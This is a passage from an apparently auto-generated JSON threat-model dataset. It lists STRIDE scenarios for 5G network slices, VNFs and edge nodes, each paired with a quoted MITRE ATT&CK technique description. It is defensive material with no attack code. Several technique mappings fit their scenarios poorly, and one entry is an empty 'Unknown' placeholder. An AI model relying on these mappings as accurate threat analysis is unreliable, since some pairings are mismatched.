            "MITRE ATT&CK Keywords": [
                "tampering",
                "insider",
                "orchestration",
                "management policies"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a vulnerability in the edge computing nodes to inject malicious commands, altering the network functionality.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has discovered and can exploit a vulnerability in edge nodes.",
                    "Role": "Attacker",
                    "Condition": "Unpatched or zero-day vulnerability"
                },
                {
                    "Assumption": "There are insufficient security controls to detect and block malicious commands.",
                    "Role": "Network Security Team",
                    "Condition": "Inadequate security control implementations"
                },
                {
                    "Assumption": "Edge computing nodes are not isolated from critical network components.",
                    "Role": "Network Architect",
                    "Condition": "Weak network segmentation"
                }
            ],
            "Potential Impact": "Manipulation of network services, integrity breaches, and potential system disruptions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "edge computing",
                "vulnerability exploitation",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user falsely denies having made specific changes to network slice configurations due to lack of proper logging.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are insufficient or incorrectly configured.",
                    "Role": "System Administrator",
                    "Condition": "Poor logging practices"
                },
                {
                    "Assumption": "There is no non-repudiation mechanism in place.",
                    "Role": "System Architect",
                    "Condition": "Lack of non-repudiation controls"
                },
                {
                    "Assumption": "Access control policies are weak, allowing unauthorized changes.",
                    "Role": "Security Administrator",
                    "Condition": "Weak access control implementation"
                }
            ],
            "Potential Impact": "Disputes over actions taken, potential unauthorized modifications, and lack of accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "configuration change",
                "access control"
            ],
            "mitre_technique": {
                "name": "Windows File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",
                "id": "attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee",
                "technique_id": "T1222.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A partner denies that their interface was used for injecting malicious traffic due to inadequate transaction recording.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks proper transaction logs for external interfaces.",
                    "Role": "Network Administrator",
                    "Condition": "Insufficient logging of transactions"
                },
                {
                    "Assumption": "Partner systems are not configured to log interactions adequately.",
                    "Role": "External Partner Administrator",
                    "Condition": "Poor logging configuration on partner systems"
                },
                {
                    "Assumption": "Mutual agreements on logging responsibilities are either absent or not enforced.",
                    "Role": "Legal/Compliance",
                    "Condition": "Lack of enforceable logging agreements"
                }
            ],
            "Potential Impact": "Difficulty in attributing actions, potential malicious activities going unaddressed, and lack of forensic evidence.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "transaction logging",
                "partner interface",
                "malicious traffic"
            ],
            "mitre_technique": {
                "name": "Protocol Tunneling",
                "description": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) \n\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. ",
                "id": "attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b",
                "technique_id": "T1572"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An administrator claims that critical VNFs were not tampered with, but insufficient evidence exists to disprove their statement.",
            "Assumptions": [
                {
                    "Assumption": "Audit logs for VNFs are not comprehensive.",
                    "Role": "System Administrator",
                    "Condition": "Poor audit logging practices"
                },
                {
                    "Assumption": "No secure tracking mechanism is in place for VNF changes.",
                    "Role": "System Developer",
                    "Condition": "Lack of tamper-evident tracking"
                },
                {
                    "Assumption": "Internal policy does not mandate detailed logging of administrative actions.",
                    "Role": "Policy Maker",
                    "Condition": "Weak internal policies"
                }
            ],
            "Potential Impact": "Disputes over administrative actions, potential untracked tampering, and difficulty in conducting forensic investigations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit logs",
                "VNF",
                "administrative actions"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts sensitive data transmitted between network slices due to unencrypted communications.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission between network slices is not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of encryption"
                },
                {
                    "Assumption": "The attacker has access to the communication channels.",
                    "Role": "Attacker",
                    "Condition": "Network access"
                },
                {
                    "Assumption": "Monitoring tools do not detect unauthorized eavesdropping.",
                    "Role": "Security Analyst",
                    "Condition": "Insufficient monitoring"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "interception",
                "unencrypted",
                "network communication"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A misconfigured access control policy grants unintended read access to sensitive data within VNFs.",
            "Assumptions": [
                {
                    "Assumption": "Access control policies are incorrectly configured.",
                    "Role": "System Administrator",
                    "Condition": "Misconfiguration"
                },
                {
                    "Assumption": "Regular audits of access controls are not performed.",
                    "Role": "Compliance Officer",
                    "Condition": "No regular audits"
                },
                {
                    "Assumption": "Users or other entities leverage the misconfiguration to access sensitive data.",
                    "Role": "User",
                    "Condition": "Exploitation of misconfigurations"
                }
            ],
            "Potential Impact": "Unauthorized data access and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "access control",
                "misconfiguration",
                "VNF"
            ],
            "mitre_technique": {
                "name": "Windows File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",
                "id": "attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee",
                "technique_id": "T1222.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A compromised edge computing node leaks sensitive data due to improper data storage practices.",
            "Assumptions": [
                {
                    "Assumption": "Edge nodes store sensitive data without proper encryption.",
                    "Role": "System Developer",
                    "Condition": "Poor data storage practices"
                },
                {
                    "Assumption": "The attacker has compromised the edge computing node.",
                    "Role": "Attacker",
                    "Condition": "Compromised node"
                },
                {
                    "Assumption": "Data leakage detection mechanisms are not in place or insufficient.",
                    "Role": "Security Operations",
                    "Condition": "Insufficient detection mechanisms"
                }
            ],
            "Potential Impact": "Leakage of sensitive data and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "edge computing",
                "data storage",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DoS attack on the NFVO, overwhelming it with excessive requests and disrupting orchestration.",
            "Assumptions": [
                {
                    "Assumption": "The NFVO is accessible from the internet.",
                    "Role": "Network Administrator",
                    "Condition": "Internet-facing NFVO"
                },
                {
                    "Assumption": "There are insufficient rate-limiting measures in place.",
                    "Role": "System Engineer",
                    "Condition": "Lack of rate limits"
                },
                {
                    "Assumption": "Detection and mitigation of such attacks are not adequately configured.",
                    "Role": "Security Operations",
                    "Condition": "Weak mitigation practices"
                }
            ],
            "Potential Impact": "Disruption of network orchestration and potential service interruptions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "NFVO",
                "excessive requests",
                "orchestration"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A botnet floods the edge and cloud computing nodes with traffic, causing service degradation or downtime.",
            "Assumptions": [
                {
                    "Assumption": "Edge and cloud nodes are exposed to the internet.",
                    "Role": "Network Administrator",
                    "Condition": "Internet-facing nodes"
                },
                {
                    "Assumption": "There is no adequate DDoS protection in place.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of DDoS protection"
                },
                {
                    "Assumption": "Attack detection and response mechanisms are not sufficiently robust.",
                    "Role": "Security Team",
                    "Condition": "Weak detection and response"
                }
            ],
            "Potential Impact": "Service degradation or downtime impacting availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "botnet",
                "edge computing",
                "cloud computing"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An insider misconfigures network slices, resulting in resource exhaustion and service disruptions.",
            "Assumptions": [
                {
                    "Assumption": "The insider has the necessary privileges to configure network slices.",
                    "Role": "Insider",
                    "Condition": "Privilege access"
                },
                {
                    "Assumption": "There are no checks or validations for slice configuration changes.",
                    "Role": "System Administrator",
                    "Condition": "Lack of change validation"
                },
                {
                    "Assumption": "Monitoring systems do not detect resource anomalies promptly.",
                    "Role": "Security Operations",
                    "Condition": "Insufficient monitoring"
                }
            ],
            "Potential Impact": "Resource exhaustion and service disruptions impacting availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "misconfiguration",
                "resource exhaustion",
                "network slices"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in VNFs to gain higher privileges within the 5G network.",
            "Assumptions": [
                {
                    "Assumption": "The vulnerability in VNFs is known and exploitable.",
                    "Role": "Attacker",
                    "Condition": "Unpatched vulnerability"
                },
                {
                    "Assumption": "There are no mechanisms to detect or prevent privilege escalation.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of prevention mechanisms"
                },
                {
                    "Assumption": "Access controls are insufficient to limit the scope of privileges.",
                    "Role": "System Administrator",
                    "Condition": "Weak access controls"
                }
            ],
            "Potential Impact": "Unauthorized actions and potential system compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "VNF",
                "vulnerability",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious insider leverages administrative access to elevate privileges beyond their assigned role.",
            "Assumptions": [
                {
                    "Assumption": "The insider has existing administrative access.",
                    "Role": "Insider",
                    "Condition": "Administrative privileges"
                },
                {
                    "Assumption": "There are insufficient checks on privilege assignments and use.",
                    "Role": "Security Administrator",
                    "Condition": "Weak privilege management"
                },
                {
                    "Assumption": "Monitoring and auditing mechanisms are inadequate to detect misuse.",
                    "Role": "Security Operations",
                    "Condition": "Insufficient monitoring"
                }
            ],
            "Potential Impact": "Unauthorized actions, data breaches, and potential system compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider",
                "administrative access",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses stolen credentials to escalate privileges across multiple network slices, gaining wider access.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has successfully obtained legitimate credentials.",
                    "Role": "Attacker",
                    "Condition": "Credential theft"
                },
                {
                    "Assumption": "Access controls do not effectively segregate network slices.",
                    "Role": "System Architect",
                    "Condition": "Weak access segregation"
                },
                {
                    "Assumption": "Monitoring systems do not detect abnormal access patterns.",
                    "Role": "Security Analyst",
                    "Condition": "Insufficient anomaly detection"
                }
            ],
            "Potential Impact": "Unauthorized access, data breaches, and extensive system compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "stolen credentials",
                "network slices",
                "access"
            ],
            "mitre_technique": {
                "name": "OS Credential Dumping",
                "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.(Citation: Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.\n\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n",
                "id": "attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22",
                "technique_id": "T1003"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "22",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a network function (NF) to gain unauthorized access to network slices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has knowledge of the NF interface.",
                    "Role": "Attacker",
                    "Condition": "Access to interface documentation or reconnaissance information."
                },
                {
                    "Assumption": "Weak or no mutual authentication methods between NFs.",
                    "Role": "System Designer",
                    "Condition": "Improper implementation of authentication protocols."
                },
                {
                    "Assumption": "Lack of anomaly detection for NF behavior.",
                    "Role": "Network Operator",
                    "Condition": "Insufficient monitoring and behavior analysis tools in place."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and network disruption.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "reconnaissance"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in 